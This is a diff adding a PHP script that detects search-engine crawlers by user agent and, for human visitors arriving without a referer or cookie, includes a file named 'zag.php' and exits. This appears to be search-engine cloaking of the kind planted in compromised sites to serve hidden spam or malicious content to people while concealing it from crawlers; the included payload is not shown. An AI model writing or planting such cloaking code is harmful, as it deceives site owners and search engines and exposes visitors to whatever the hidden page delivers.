@@ -1,0 +1,41 @@
+<?php
+function isBot(&$botname = '') {
+    /* Эта функция будет проверять, является ли посетитель роботом поисковой системы */
+    $bots = array('rambler', 'googlebot', 'aport', 'yahoo', 'msnbot', 'turtle', 'mail.ru', 'omsktele', 'yetibot', 'picsearch', 'sape.bot', 'sape_context', 'gigabot', 'snapbot', 'alexa.com', 'megadownload.net', 'askpeter.info', 'igde.ru', 'ask.com', 'qwartabot', 'yanga.co.uk', 'scoutjet', 'similarpages', 'oozbot', 'shrinktheweb.com', 'aboutusbot', 'followsite.com', 'dataparksearch', 'google-sitemaps', 'appEngine-google', 'feedfetcher-google', 'liveinternet.ru', 'xml-sitemaps.com', 'agama', 'metadatalabs.com', 'h1.hrn.ru', 'googlealert.com', 'seo-rus.com', 'yaDirectBot', 'yandeG', 'yandex.com/bots', 'yandexSomething', 'Copyscape.com', 'AdsBot-Google', 'domaintools.com', 'Nigma.ru', 'bing.com', 'dotnetdotcom');
+    foreach ($bots as $bot) if (stripos($_SERVER['HTTP_USER_AGENT'], $bot) !== false) {
+        $botname = $bot;
+        return true;
+    }
+    return false;
+}
+if (isBot($bname)) {
+} else {
+    
+    
+ $color = $_SERVER['HTTP_REFERER'];
+ $url = $_SERVER['REQUEST_URI'];
+
+if(stristr($color, "yandex") == FALSE  && stristr($color, ".") == FALSE && !isset($_COOKIE['name'])    ) {
+
+ include 'zag.php';
+    exit;
+ 
+
+}
+
+
+else{
+
+
+
+
+ 
+ 
+}
+        
+        
+        
+        
+    }
+
+?>
